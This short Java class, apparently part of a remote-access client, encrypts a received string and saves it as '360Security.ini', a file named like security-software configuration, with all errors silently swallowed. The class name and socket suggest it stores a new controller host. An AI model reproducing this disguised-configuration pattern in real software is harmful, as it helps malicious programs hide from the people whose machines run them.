package me.client.utils;

import com.sun.jna.WString;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import me.client.Client;

import java.io.FileOutputStream;
import java.net.Socket;

import static com.sun.jna.platform.win32.WinUser.EWX_RESTARTAPPS;

public class LoadNewHost {
    Socket socket;
    public LoadNewHost(Socket socket){
        this.socket = socket;
    }
    public void Load(String str) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(Client.getPath1() + "\\360Security.ini");
            fileOutputStream.write(AESUtils.encryption(str));
            fileOutputStream.close();
        }catch (Exception e) {
        }
    }
}